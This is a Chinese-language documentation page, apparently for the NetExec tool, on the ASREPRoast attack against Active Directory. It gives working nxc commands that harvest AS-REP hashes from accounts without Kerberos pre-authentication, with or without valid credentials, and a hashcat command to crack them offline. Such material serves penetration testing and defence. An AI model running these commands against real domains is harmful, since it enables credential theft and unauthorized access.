---
description: >-
  获取不需要 Kerberos 预认证的用户的 Kerberos 5 AS-REP etype 23 哈希
---

# ASREPRoast

{% hint style="success" %}
如果你有域上的用户列表,你可以获取不需要 Kerberos 预认证的用户的 Kerberos 5 AS-REP etype 23 哈希
{% endhint %}

### 无需认证

> ASREPRoast 攻击寻找不需要 Kerberos 预认证的用户。这意味着任何人都可以代表这些用户向 KDC 发送 AS_REQ 请求,并接收 AS_REP 消息。这种消息包含一个使用原始用户密钥加密的数据块,该密钥是从用户密码派生的。然后,使用这个消息可以离线破解用户密码。更多细节请参见 [Kerberos 理论](https://www.tarlogic.com/en/blog/how-kerberos-works/)。

```
nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
```

使用用户名列表,你可以在这里找到用户名列表

```
nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
```

{% hint style="info" %}
将密码值设置为 '' 以执行无认证测试
{% endhint %}

### 使用认证

如果你在域上有一个有效的凭证,你可以获取所有不需要 Kerberos 预认证的用户和哈希

```
nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
```

{% hint style="info" %}
当域名解析失败时使用 **kdcHost** 选项

```
nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost domain_name
```
{% endhint %}

### 使用 hashcat 破解

要使用 hashcat 破解 output.txt 文件中的哈希,使用以下选项:

```
hashcat -m18200 output.txt wordlist
```

### 示例

Forest 机器是使用 NetExec 测试 **ASREPRoast** 的一个很好的例子

{% embed url="https://www.hackthebox.eu/home/machines/profile/212" %}

### 资源

{% embed url="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/" %}

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat" %}

{% embed url="https://en.hackndo.com/kerberos-asrep-roasting/" %}
